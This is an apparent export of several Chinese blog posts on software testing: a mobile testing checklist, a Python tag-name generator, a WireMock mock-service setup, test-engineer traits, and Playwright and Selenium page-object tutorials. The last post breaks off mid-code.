从自动化的角度来看，如果您可以在选定的设备上并行运行测试并根据上述步骤中设置的标准选择一些最新的设备，那就太好了。因此，从回归的角度来看，最好所有的端到端测试都可以用自动化方式运行，并在出现任何问题时自动告警。 由于某些原因，无法将某些测试用例作为自动化的一部分进行覆盖，因为我们都知道并非所有内容都可以实现自动化，那么可以在手动探索性测试活动中进行覆盖。 `\n下面是一些额外的检查项：\n从一个界面移动到另一个时，不会多次调用相同的 API。 抖动抑制也是一个重要的检查项，因为它最终会影响应用程序的性能。例如在特定屏幕上多次执行下拉刷新，并在每次完成刷新时发送请求检查。这里的预期结果是虽然用户多次下拉刷新，但刷新屏幕的请求应该只在特定的时间间隔发送，而不是每次发送。这将确保应用程序的性能不会因为几秒钟内的多个请求而受到影响。 注意 UI 字体/颜色和文本大小是很好的，因为在移动应用程序中它对最终用户很重要，甚至背景颜色/字体/字体大小的视觉变化也会影响应用程序的整体使用。因此，检查颜色组合、字体、字体大小等的一致性是必要的。 我建议让 UI/UX 人员参与测试会话，以便他们可以公平地向我们展示问题和还原度的差异，防患于未然。 通过在 1-2 台不同的设备上手动运行应用程序来检查应用程序的功能和性能。 还应检查前端生成的步骤日志。因为如果生产环境中出现任何问题，日志将有助于问题的定位 进入日志时，请检查是否有任何个人信息 (PII) 未记录在日志中，因为这会导致法律后果。 我们还可以检查应用程序的导航和 Web 视图中链接的打开情况，因为它是一个混合应用程序，我们应该期望应用程序中的所有链接都应该在 Web 视图中打开，而不是在外部浏览器上打开 检查应用程序是否正确发送通知，并且这些通知是否正确显示在手机的通知区域中。 我们可以检查通知消息是否将用户导航到应用程序中的相应区域。 如果用户正在运行其他应用程序并且此应用程序的通知出现在两者之间，它会是什么样子？除非它是用户友好的，否则这可能是最终用户的痛点，最终可能导致用户卸载应用程序。 其他的通用型测试 手机电池使用场景：\n检查应用程序是否大量消耗电池，因为这会导致最终用户卸载应用程序。预期结果是应用程序在工作时应使用最少的电池。 测试app在后台时的电池使用情况。它也应该是最小的。 与移动设备闲置相关的场景：\n如果您在应用程序中实现了登录功能，您可以在应用程序被用户闲置一段时间并进入后台后检查应用程序是否有注销用户。 如果您有一个支付相关的应用程序，例如，如果手机闲置一段时间后执行支付，那么该应用程序应该可以顺利运行并成功执行所需的交易。 在手机闲置的情况下，App不应该消耗大量电池，并且我们可以检查手机是否发热，因为这会导致负面评论并影响整体业务。 app进入后台一段时间以后用户尝试去唤醒并继续使用时应用程序应该有什么样的表现？这纯粹是一个技术方案，可以与团队讨论并根据技术要求相应实施。 锁屏相关场景：\n我们还可以检查手机锁定场景，例如，在应用程序中获取任何数据时，应用程序需要很长的时间，同时如果用户手机被锁定，那么应用程序应该在后台保持活动并执行用户需要的进行的操作。 另一种情况是，如果用户在正在进行的交易期间故意锁定手机，在这种情况下也应该预期交易成功完成并且交易不会被取消。 另一个要检查的情况是手机在使用应用程序时锁屏了，我们可以再次检查电池使用情况，电池消耗应该最小。 联网/WiFi 和定位服务相关的场景：\n当手机上的网络关闭时，我们可以检查应用程序在某些交易过程中是否会中断。在这里，预计应该向用户显示带有“No Internet”的提示。 接下来，我们可以检查网络何时恢复并且用户再次在线，在这种情况下，应用程序应该恢复正常工作并且不应该显示“No Internet”的提示。 用户应该能够在连接到 WiFi 和移动网络时使用该应用程序。 另一个检查点是通过将手机连接到移动热点并检查应用程序是否运行顺畅，虽然这种情况不需要深入测试，但是执行此测试是好的。 我们可以通过突然打开飞行模式来检查应用程序的行为。如果应用程序具有某些依赖项，例如与智能手表相关的应用程序，则设备应断开连接且不会出现任何错误消息，并且应运行流畅而不会导致应用程序崩溃。 同样，通过关闭飞行模式，一切都应该恢复正常，只需最少的用户干预。 我们可以通过打开/关闭手机中的定位服务并检查应用程序是否能够分别发现位置服务打开/关闭，并在应用程序中显示适当的获取权限消息 总结 总之上面的检查项都来自作者的既往的经验，更多的测试内容就需要大家自行添加了。\n到这里翻译就结束了。\n喜加一 这里我补充一点，也是容易忽视的一点：移动应用如果是运行在手机上的，那么在程序运行过程中的一些硬中断测试也是需要的，比如使用过程中电话打入，突然没电了，突然弹出强制升级更新等等。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%A7%BB%E5%8A%A8%E6%B5%8B%E8%AF%95%E6%8C%87%E5%8D%97/","title":"移动测试指南"},{"content":"我们发布比较频繁，每次发布都需要从release分支打1个tag，不过可能是因为年纪大了的缘故吧，尽管借鉴了一些版本号的制定规则，不过每次我都记不太住，需要翻文档去重新复习，不如把这步自动化一下，为未来的自己节约一点时间，另外有了工具就好统一规则，后面所有相关的项目都可以用同一套规则来生成版本号，去掉了人工对齐的成本，变相提升了效率。\n版本号规则 我们的版本号大概长这个样子\n1 2 v1.00.0-hotfix-20221111-1 版本号 发布类型 发布时间 第几次发布 版本号规则: 大版本1位 + 小版本2位 + patch版本号1，比如v1.00.0表示大版本是1，小版本是0，patch版本是0 发布类型：普通发布/hotfix/adhoc(临时版本) 设计 首先不考虑写页面做系统，其实用vue随便写个单页应用是可以很快搞定的，不过没那个必要，用命令行工具就好了，简单快速，而且生成了版本号之后可以调用githlab(我们公司用私有化部署的版本)api来自动打tag，在微服务化当道的今天，手动为每次发布的所有repo打版本号本身就不是一个很好的体验。命令行工具在这方面比单页应用更具优势一些。\n另外交互式的命令行可以省去很多参数validation的工作量，这也应该是考虑的。随便搜索了一下，发现了1个名为inquirer的库可以很好的满足我的需求。\n代码实现 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 import inquirer from datetime import datetime STR_MAP = { \u0026#39;regular\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;hotfix\u0026#39;: \u0026#39;-hotfix\u0026#39;, \u0026#39;adhoc\u0026#39;: \u0026#39;-adhoc\u0026#39; } def build_version(options): release_type = STR_MAP[options[\u0026#39;release_type\u0026#39;][0]] date = datetime.now().strftime(\u0026#39;%Y%m%d\u0026#39;) return f\u0026#34;v{options[\u0026#39;version\u0026#39;]}{release_type}-{date}-{options[\u0026#39;seq\u0026#39;]}\u0026#34; if __name__ == \u0026#34;__main__\u0026#34;: questions = [ inquirer.Text(\u0026#34;version\u0026#34;, message=\u0026#34;Please enter a version, for sample 1.00.0\u0026#34;, default=\u0026#39;2.00.0\u0026#39;), inquirer.Checkbox( \u0026#34;release_type\u0026#34;, message=\u0026#34;Please select a release type\u0026#34;, choices=[\u0026#34;regular\u0026#34;, \u0026#34;hotfix\u0026#34;, \u0026#34;adhoc\u0026#34;], default=[\u0026#39;regular\u0026#39;] ), inquirer.Text(\u0026#34;seq\u0026#34;, message=\u0026#34;please enter the sequence\u0026#34;, default=\u0026#39;1\u0026#39;), inquirer.Confirm( \u0026#34;correct\u0026#34;, message=\u0026#34;This will generate a tag name. Continue?\u0026#34;, default=False, ), ] answers = inquirer.prompt(questions) if answers[\u0026#39;correct\u0026#39;]: tag_name = build_version(answers) print(tag_name) else: print(\u0026#39;nothing to do\u0026#39;) 整体流程非常的简单\n提示用户输入版本号，也就是类似1.00.0这串，由于给了default值，所以只需要稍微修改一下就可以了 提示用户选择发布类型，默认是regular，也就是正常发布 提示用户输入当天的发布次数，默认值给了1，用户可以自行修改 提示用户确认 打印版本号 效果演示 1 2 3 4 5 6 7 8 9 10 11 ➜ deploy python create_tag.py [?] Please enter a version, for sample 1.00.0: 2.00.0 [?] Please select a release type: \u0026gt; X regular o hotfix o adhoc [?] please enter the sequence: 1 [?] This will generate a tag name. Continue? (y/N): y v2.00.0-20221118-1 后续 由于我打通了gitlab的api，版本号生成之后我会提示用户选择项目并自动去release分支打tag，如果tag创建成功的话，我就自动选择该tag进行发布。下面是一些示例代码。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 questions = [ inquirer.Confirm( \u0026#34;create_tag\u0026#34;, message=f\u0026#34;tag name is {tag_name}, do you want to create a tag on gitlab?\u0026#34;, default=False, ), ] answers = inquirer.prompt(questions) if answers[\u0026#39;create_tag\u0026#39;]: questions = [ inquirer.Checkbox( \u0026#34;project\u0026#34;, message=\u0026#34;Please select a project\u0026#34;, choices=[\u0026#34;project A\u0026#34;, \u0026#34;project B\u0026#34;, \u0026#34;Porject C\u0026#34;], ), ] answers = inquirer.prompt(questions) git = GitLabAPI(answers[\u0026#39;project\u0026#39;]) git.create_tag(tag_name) else: print(\u0026#39;nothing to to. quit\u0026#39;) exit() 总结 当一件事情需要周期性的手工做n次的时候，花一点点时间进行自动化是一件非常值得的事情的。既提升了工作效率，又提升了代码量，一举两得何乐不为呢？\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%94%A8python%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%9A%84%E7%89%88%E6%9C%AC%E5%8F%B7%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/","title":"用python实现简单的版本号生成工具"},{"content":"我们很多时候都需要mock服务，比如\n在做性能测试的时候，我们希望调用第三方服务的接口可以被mock掉，这样就不会因为压测而对第三方依赖造成巨大的负载 第三方服务归属于其他团队，不同环境之间的沟通和协调其实比较麻烦 消除不同测试环境之间的差异 控制请求的时延 如果是使用云服务的话，使用mock接口还可以节约出口的带宽 提升第三方服务的稳定性 所以mock的作用就是用最小的代价实现跟第三方接口几乎一样的假的接口，最好返回的内容是动态可配置的，这样我们在测试环境就可以直接去调用这个假接口，从而消除了对第三方的依赖。\n实现mock的方式很多，最简单的做法就是随机应变，自行实现，比如在python技术栈里，我们可以用flask去这样实现\n1 2 3 4 5 6 7 from flask import Flask, jsonify app = Flask(__name__) @app.route(\u0026#39;/api/get-json\u0026#39;) def hello(): return jsonify(hello=\u0026#39;world\u0026#39;) # Returns HTTP Response with {\u0026#34;hello\u0026#34;: \u0026#34;world\u0026#34;} 用go实现起来也不难，下面的例子来自go的官方文档，使用了gin框架。https://go.dev/doc/tutorial/web-service-gin\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 package main import ( \u0026#34;net/http\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; ) // album represents data about a record album. type album struct { ID string `json:\u0026#34;id\u0026#34;` Title string `json:\u0026#34;title\u0026#34;` Artist string `json:\u0026#34;artist\u0026#34;` Price float64 `json:\u0026#34;price\u0026#34;` } // albums slice to seed record album data. var albums = []album{ {ID: \u0026#34;1\u0026#34;, Title: \u0026#34;Blue Train\u0026#34;, Artist: \u0026#34;John Coltrane\u0026#34;, Price: 56.99}, {ID: \u0026#34;2\u0026#34;, Title: \u0026#34;Jeru\u0026#34;, Artist: \u0026#34;Gerry Mulligan\u0026#34;, Price: 17.99}, {ID: \u0026#34;3\u0026#34;, Title: \u0026#34;Sarah Vaughan and Clifford Brown\u0026#34;, Artist: \u0026#34;Sarah Vaughan\u0026#34;, Price: 39.99}, } func main() { router := gin.Default() router.GET(\u0026#34;/albums\u0026#34;, getAlbums) router.GET(\u0026#34;/albums/:id\u0026#34;, getAlbumByID) router.POST(\u0026#34;/albums\u0026#34;, postAlbums) router.Run(\u0026#34;localhost:8080\u0026#34;) } // getAlbums responds with the list of all albums as JSON. func getAlbums(c *gin.Context) { c.IndentedJSON(http.StatusOK, albums) } // postAlbums adds an album from JSON received in the request body. func postAlbums(c *gin.Context) { var newAlbum album // Call BindJSON to bind the received JSON to // newAlbum. if err := c.BindJSON(\u0026amp;newAlbum); err != nil { return } // Add the new album to the slice. albums = append(albums, newAlbum) c.IndentedJSON(http.StatusCreated, newAlbum) } // getAlbumByID locates the album whose ID value matches the id // parameter sent by the client, then returns that album as a response. func getAlbumByID(c *gin.Context) { id := c.Param(\u0026#34;id\u0026#34;) // Loop through the list of albums, looking for // an album whose ID value matches the parameter. for _, a := range albums { if a.ID == id { c.IndentedJSON(http.StatusOK, a) return } } c.IndentedJSON(http.StatusNotFound, gin.H{\u0026#34;message\u0026#34;: \u0026#34;album not found\u0026#34;}) } 从上面的代码可以看出来，如果不需要实现创建接口的话，代码量还能少三分之一左右，总的来看其实难度也不算大。\n对于有兴趣写代码的同学来说，上面两种做法都是值得赞赏的，不过后面的部署和维护问题可能会随着代码量的增加而变得麻烦起来。这时候使用通用的mock服务可能会更简单一些。\nMock as a Service 这是一种提供mock能力的通用方式，相比于写代码，mock as a service可以提供更加简单灵活的创建mock接口的方式，比如\n通过ui界面上的表单 发送http请求 配置文件 我们可以自己实现这样的mock服务，不过这样会有一定的难度，比如\n平台的形态是什么样的？ 如果有ui，那么谁来设计，谁来实现？ 如果这是command line，那么用户会不会从入门到放弃？ 如何保证灵活性和扩展性？ 谁来部署和维护？ 另外mock平台其实不同企业之间的共性也是很明显的，所以如果市面上有通用解决方案的话，我们直接拿来用也不是不可以。\nwiremock wiremock就是这样一款工具，项目地址：https://github.com/wiremock/wiremock\n其主要的特性有\n更高级的请求匹配方式 动态响应模板 可以在单元测试里运行 故障注入和时延注入 支持录制和回放 支持通过java python http 和json文件来定义mock接口 我简单看了一下，比我自己写的话要好很多。\n安装 建议docker安装。\n1 2 3 4 5 docker run -it --rm \\ -p 8080:8080 \\ --name wiremock \\ -v $PWD:/home/wiremock \\ wiremock/wiremock:2.33.1 本文写作的时候，wiremock的最新版本是2.33.1。\n这里重点解释一下 -v 参数，这里我们把当前文件夹映射到了容器的/home/wiremock/ 路径下，运行之后当前路径会生成2个新的文件夹，分别是\n__files __mappings 运行之后命令行展示如下，看到这个界面就是服务启动成功了，可以用ctrl+c来停止服务\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 SLF4J: Failed to load class \u0026#34;org.slf4j.impl.StaticLoggerBinder\u0026#34;. SLF4J: Defaulting to no-operation (NOP) logger implementation SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details. /$$ /$$ /$$ /$$ /$$ /$$ | $$ /$ | $$|__/ | $$$ /$$$ | $$ | $$ /$$$| $$ /$$ /$$$$$$ /$$$$$$ | $$$$ /$$$$ /$$$$$$ /$$$$$$$| $$ /$$ | $$/$$ $$ $$| $$ /$$__ $$ /$$__ $$| $$ $$/$$ $$ /$$__ $$ /$$_____/| $$ /$$/ | $$$$_ $$$$| $$| $$ \\__/| $$$$$$$$| $$ $$$| $$| $$ \\ $$| $$ | $$$$$$/ | $$$/ \\ $$$| $$| $$ | $$_____/| $$\\ $ | $$| $$ | $$| $$ | $$_ $$ | $$/ \\ $$| $$| $$ | $$$$$$$| $$ \\/ | $$| $$$$$$/| $$$$$$$| $$ \\ $$ |__/ \\__/|__/|__/ \\_______/|__/ |__/ \\______/ \\_______/|__/ \\__/ port: 8080 enable-browser-proxying: false disable-banner: false no-request-journal: false verbose: false 当然，因为wiremock是使用java实现的，我们也可以用启动jar包的方式来运行，前提是需要安装jdk或者是jre。\n1 java -jar wiremock-jre8-standalone-2.33.1.jar 更多配置项可以参考文档：https://wiremock.org/docs/running-standalone/\n静态mock一个接口 下面我们来写一个静态的mock接口，静态的意思是接口的返回是写死的，不是动态的。\n创建一个名为example.json的文件，内容如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 { \u0026#34;request\u0026#34;: { \u0026#34;method\u0026#34;: \u0026#34;GET\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;/products/1\u0026#34; }, \u0026#34;response\u0026#34;: { \u0026#34;status\u0026#34;: 200, \u0026#34;fixedDelayMilliseconds\u0026#34;: 1000, \u0026#34;jsonBody\u0026#34;: { \u0026#34;data\u0026#34;: [{ \u0026#34;type\u0026#34;: \u0026#34;product\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;attributes\u0026#34;: { \u0026#34;productName\u0026#34;: \u0026#34;Raspberry PI\u0026#34;, \u0026#34;productDescription\u0026#34;: \u0026#34;Best product ever\u0026#34;, \u0026#34;price\u0026#34;: 42, \u0026#34;stock\u0026#34;: 500 } }] } } } 把这个文件放到/mappings路径下面，然后重新启动服务，然后浏览器访问或者curl:http://localhost:8080/products/1，响应结果如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 { \u0026#34;data\u0026#34;: [ { \u0026#34;type\u0026#34;: \u0026#34;product\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;1\u0026#34;, \u0026#34;attributes\u0026#34;: { \u0026#34;productName\u0026#34;: \u0026#34;Raspberry PI\u0026#34;, \u0026#34;productDescription\u0026#34;: \u0026#34;Best product ever\u0026#34;, \u0026#34;price\u0026#34;: 42, \u0026#34;stock\u0026#34;: 500 } } ] } 反向代理模式 我们可以使用nginx的反向代理模式来提升wiremock的容量。docker-compose.yml如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 version: \u0026#34;2\u0026#34; services: wiremock: image: wiremock/wiremock:2.33.1 volumes: - ../mappings:/home/wiremock/mappings:ro ports: - 8080 nginx-load-balancer: image: nginx:alpine volumes: - ./nginx.conf:/etc/nginx/nginx.conf:ro depends_on: - wiremock ports: - \u0026#34;80:8080\u0026#34; ng的配置如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 user nginx; events { worker_connections 1000; } http { server { listen 8080; location / { proxy_pass http://wiremock:8080; } } } 运行：docker-compose up -d\n停止: docker-compose stop\n更高的流量要求 如果我们需要部署一个企业级的mock服务，那么ng+wiremock的方式可能达不到一个很高的容量上限，这时候我们可以使用ks8，通过k8s serivce的负载均衡机制，多启动一些wiremock pod来提升系统的整体吞吐量。\n总结 在时间有限和需求变化相对较快的情况下，wiremock+ng应该是一个不错的通用mock服务解决方案。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E7%94%A8wiremock%E8%87%AA%E5%BB%BAmock%E6%9C%8D%E5%8A%A1/","title":"用wiremock自建mock服务"},{"content":"原文地址：https://medium.com/geekculture/five-cs-of-a-test-engineer-59f0f74049d8\n简单来说，优秀的测试工程师应该具备下面的5种特质，因为对应的英文单词都是c开头，所以可以简称为5c特质。\nCritical Thinking 批判性思维。\n这是经常被人忽视的点，测试同学经常需要收集信息，对多个渠道的获取的信息进行整合和判断，具有批判性思维可以让我们理性清晰的思考，了解信息之间的逻辑性以及对业务和用户的造成的影响。\nCommunication 沟通。\n这点是毋庸置疑的了，如果无法进行高效的沟通和表达，那么发现再多的缺陷和问题都没什么大用处了，测试工程师往往是杰出的沟通者。\nCollaboration 协作。\n测试同学一般不会孤立的工作，或者这样说，不应该孤立的工作。我们是团队的一员，大部分时间都在与开发人员和产品人员通力合作，同时收集有关业务规则和上下文的知识。因此，协作便成为了测试工程师为团队带来贡献的日常基本技能。\nCreativity 创造力。\n创造性和跳出条条框框进行思考是一种技能，它经常让我们找出那些可能会对整个产品产生巨大影响的不受欢迎的边缘情况，从而提升我们的自身的影响力，而影响力则在高级测试工程师所具有的独门技能中排名第一。创造力可以理解为不走寻常路，独辟蹊径的能力，在探索性测试的时候非常关键。\nCoding 每个测试工程师都需要具备表达和阐明业务规则并轻松为其进行领域建模的技能。他们是将实际用例和业务逻辑转换为代码的专家。\n综上，不过这几个技能套在开发同学身上也能行得通，可以这么认为在软件相关的行业，优秀的人才往往具备一些共性的特质，而这些特质是可以通过工作和学习进行培养和训练的。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E4%BC%98%E7%A7%80%E6%B5%8B%E8%AF%95%E5%B7%A5%E7%A8%8B%E5%B8%88%E7%9A%845c%E7%89%B9%E8%B4%A8/","title":"优秀测试工程师的5c特质"},{"content":"\n这是最近看到的一个有意思的bug，乍一看好像确实没有问题，不过稍微想一想就知道症结所在了。不知道你能不能看出来，评论区给出你的解读吧。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84bug/","title":"有意思的bug"},{"content":"playwright一直是我最看好的新一代自动化测试框架，2022年底playwright在npm上的下载量超过了100万，尽管不如selenium和cypress，不过势头还是相当强劲的。最近正好发现一篇文章简单的介绍了使用typescript，pageobject和fixture配合playwright进行用例编写的文章，这里把里面的精华拿出来分享一下。\n老生常谈，playwright的优势 有个好爹，微软出品，看好长期更新维护和迭代，但也可能突然被砍掉，毕竟大公司都在裁员 运行速度快 自动等待元素出现 报告的呈现很多元化，可以设置重试机制，捕获执行日志，截屏录屏等 支持多个浏览器并行执行 提供自动生成代码能力以及Inspector GUI 一套代码，跨浏览器执行的能力 目录结构 框架整体的目录结构如下。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 . ├── config │ ├── global-setup.ts │ └── playwright.config.ts ├── package-lock.json ├── package.json └── src ├── data │ └── data.json ├── fixtures │ ├── AxeFixture.ts │ └── TodoFixture.ts ├── pages │ └── TodoPage.ts └── tests ├── a11y.spec.ts └── demo-pom-todo-app.spec.ts config目录 playwright.config.ts playwright的配置文件 global-setup.ts 在所有用例执行前运行一次，主要的目的是登录一次被测系统并保存浏览器的全局状态到storageState.json文件中。这样就不需要每个用例都去单独登录一次了。更多信息可以参考文档。https://playwright.dev/docs/test-advanced#global-setup-and-teardown Page Object po基本上是自建框架的必选项了。具体的实现如下\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 import { expect, Locator, Page } from \u0026#39;@playwright/test\u0026#39;; export class TodoDemoPage { readonly page: Page; readonly newTodoInput: Locator; readonly todoTitle: Locator; readonly todoCount: Locator constructor(page: Page) { this.page = page; this.newTodoInput = page.getByPlaceholder(\u0026#39;What needs to be done?\u0026#39;); this.todoTitle = page.getByTestId(\u0026#39;todo-title\u0026#39;); this.todoCount = page.getByTestId(\u0026#39;todo-count\u0026#39;); } async goto() { await this.page.goto(\u0026#39;https://demo.playwright.dev/todomvc\u0026#39;); } async addTodo(data: string) { await this.newTodoInput.fill(data) await this.newTodoInput.press(\u0026#34;Enter\u0026#34;) } async addDefaultTodos(todosItems: string[]) { for (const todo of todosItems) { await this.addTodo(todo) } } ... } 关于po需要注意几点\n命名规则，确保页面上的元素和一些页面方法都有合适的名称 一个方法只做一件事情，而且可以通过方法名推测出来 对页面呈现的一些结果进行断言 dry，don’t repeat yourself Fixtures fixture可以简单理解为准备数据，设置上下文环境\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 import { test as base } from \u0026#39;@playwright/test\u0026#39;; import { TodoDemoPage } from \u0026#39;../pages/TodoPage\u0026#39;; type MyFixtures = { todoDemoPage: TodoDemoPage; noneExistingPage: any }; export const todoDemoPage = async({page}, use) =\u0026gt; { const todoDemoPage = new TodoDemoPage(page); // Set up the fixture. await todoDemoPage.goto(); // Use the fixture value in the test. await use(todoDemoPage); } // we can create as many fixtures as we want, but I prefer to store them in separate files export const noneExistingPage = async({page}, use) =\u0026gt; { // Let\u0026#39;s imagine we have another fixter-page set up here } export const test = base.extend\u0026lt;MyFixtures\u0026gt;({todoDemoPage, noneExistingPage}); 上面的代码其实就是创建了TotoDemoPage，后面用例里就可以直接使用这个页面了。\nfixture的好处还是很多的。\nfixture让setup和teardown钩子函数在同一个地方进行定义，这样就比较好维护了 fixture可以重复使用 fixture按需使用，定义了你也可以不用 fixture可以组合使用 测试用例 用例相对就比较简单的，因为难的部分已经搞完了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 import { test } from \u0026#39;../fixtures/TodoFixture\u0026#39; const TODO_ITEMS = [ \u0026#39;buy some cheese\u0026#39;, \u0026#39;buy bottle of wine, or two\u0026#39;, \u0026#39;celebrate\u0026#39; ]; // our test is imported from fixtures folder // so we can have access to tododDempPage and noneExistingPage objects // in callback function trhough destructuring and we can use it for our needs test.describe(\u0026#39;New Todo\u0026#39;, () =\u0026gt; { test(\u0026#39;should allow me to add todo items\u0026#39;, async ({ todoDemoPage }) =\u0026gt; { await todoDemoPage.addTodo(TODO_ITEMS[0]) await todoDemoPage.checkInputIsEmpty(); await todoDemoPage.addTodo(TODO_ITEMS[1]) await todoDemoPage.checkAddedTodos([TODO_ITEMS[0], TODO_ITEMS[1]]) await todoDemoPage.checkNumberOfTodosInLocalStorage(2); }); test(\u0026#39;should clear text input field when an item is added\u0026#39;, async ({ todoDemoPage }) =\u0026gt; { await todoDemoPage.addTodo(TODO_ITEMS[0]) await todoDemoPage.checkInputIsEmpty(); await todoDemoPage.checkNumberOfTodosInLocalStorage(1); }); test(\u0026#39;should append new items to the bottom of the list\u0026#39;, async ({ todoDemoPage }) =\u0026gt; { await todoDemoPage.addDefaultTodos(TODO_ITEMS); await todoDemoPage.checkDefaultAddedTodods(TODO_ITEMS); await todoDemoPage.checkAddedTodos(TODO_ITEMS) await todoDemoPage.checkNumberOfTodosInLocalStorage(3); }); }); 用例很简洁易懂对吧。这里断言都封装在了page object里，所以整个流程全是对po实例进行调用，很统一，不过我不是很喜欢这种方式，我更喜欢把原生断言放在用例里，这样po层会更简洁一些，要不需要绞尽脑汁去给封装断言的方法取名。\nCICD 可以在官方文档找到方法。https://playwright.dev/docs/ci\n总结 https://github.com/eugeniuszG/playwright-starter 这里有框架模板，大家可以下载下来进行二次开发，最后感谢作者的总结和示例。\n","date":"2023-04-07T14:39:24+08:00","permalink":"zh.ethanhan.cc/p/%E5%9C%A82023%E4%BD%BF%E7%94%A8playwright%E8%BF%9B%E8%A1%8C%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95/","title":"在2023使用playwright进行自动化测试"},{"content":"之前看到的一篇对于po的改进的文章，非常有启发，简单翻译改写了一下，希望对大家有帮助。本文基于java，至于其他语言是否有类似的实现，没有具体研究过。\n原文地址: http://www.eliasnogueira.com/better-page-objects-strategy-using-ajaxelementlocatorfactory-with-selenium-and-java\nPO模式是page object factory设计模式的简称，主要是以页面为维度来聚合一些元素的定位，让代码有更好的维护性和重用性，具体细节可以看这里：https://www.selenium.dev/documentation/test_practices/encouraged/page_object_models。这里是官方文档，非常值得精读。\nPage Factory 如果你已经对po很熟悉了，下面的内容可以放心跳过。\n下面是最基本的Page Factory套路，本质上是按页面去封装元素定位和操作。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 public class PageObjectExample { private final WebDriver driver; public PageObjectExample(WebDriver driver) { this.driver = driver; } public void login(String email, String password) { driver.findElement(By.id(\u0026#34;email\u0026#34;)).sendKeys(email); driver.findElement(By.id(\u0026#34;password\u0026#34;)).sendKeys(password); driver.findElement(By.name(\u0026#34;next\u0026#34;)).click(); } } 上面的代码只能说懂的都懂，不过这里有个问题，在login方法里，我们频繁使用driver.findElement方法，这会显得有一些的啰嗦，下面是改进版本，优雅了很多。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 public class PageObjectExample { @FindBy(id = \u0026#34;email\u0026#34;) private WebElement email; @FindBy(id = \u0026#34;password\u0026#34;) private WebElement password; @FindBy(name = \u0026#34;next\u0026#34;) private WebElement next; public PageObjectExample(WebDriver driver) { PageFactory.initElements(driver, this); } public void login(String email, String password) { this.email.sendKeys(email); this.password.sendKeys(password); next.click(); } } 这里要注意的是在进行初始化的时候，需要调用PageFactory.initElements(driver, this);\n本质上这行代码的作用是将上面的注解@FindBy转换成基本的findElement形式。\n参考资料：https://github.com/SeleniumHQ/selenium/wiki/PageFactory\nPO模式的常见问题 等待策略。selenium提供了3种测试，分别是显示，隐式，以及流利等待(fluent wait)，一般情况下隐式等待是不推荐的。\n在po中，我们会在2种情况下用到等待，分别是初始化po对象时以及在action方法时，action方式其实就是指的包含有元素操作的方法。\n初始化时等待\n如果操作的对象在页面加载时候就会渲染完毕的话，那么在初始化时等待将会是一个非常好的实践。总体的实现思路是在初始化时告诉po，我们明确希望等待哪个元素出现，并且最多等待多久。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 public class PageObjectExample { private WebDriver driver; @FindBy(id = \u0026#34;email\u0026#34;) private WebElement email; @FindBy(id = \u0026#34;password\u0026#34;) private WebElement password; @FindBy(name = \u0026#34;next\u0026#34;) private WebElement next; public PageObjectExample(WebDriver driver) { this.driver = driver; PageFactory.initElements(driver, this); new WebDriverWait(driver, Duration.of(5, ChronoUnit.SECONDS)) .until(ExpectedConditions.visibilityOf(email)); } public void login(String email, String password) { this.email.sendKeys(email); this.password.sendKeys(password); next.click(); } } 上面的代码中我们希望在初始化页面对象时，其实也就是在页面加载的时候明确等待email这个元素出现，超时时间为5s。\n操作时等待\n这里的做法是先等待再操作，比如\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 public class PageObjectExample { private WebDriver driver; @FindBy(id = \u0026#34;email\u0026#34;) private WebElement email; @FindBy(id = \u0026#34;password\u0026#34;) private WebElement password; @FindBy(name = \u0026#34;next\u0026#34;) private WebElement next; public PageObjectExample(WebDriver driver) { PageFactory.initElements(driver, this); } public void fillEmail(String email) { new WebDriverWait(driver, Duration.of(5, ChronoUnit.SECONDS)) .until(ExpectedConditions.visibilityOf(this.email)); this.email.sendKeys(email); } } 其实就是把等待的代码换了个位置而已。\n简化等待操作 上面方式可以运行的很好，不过还是有点太啰嗦了，下面的做法可以缓解一下\n在PageFactory.initiElements中调用 AjaxElementLocatorFactory 方法，这样可以无脑等待； 继承PageFactory.initiElements方法，这样子类里就不用反复写了 下面是基本的代码\n1 2 3 4 5 6 7 8 9 10 public class PageObjectExample { private WebDriver driver; // WebElements ignored public 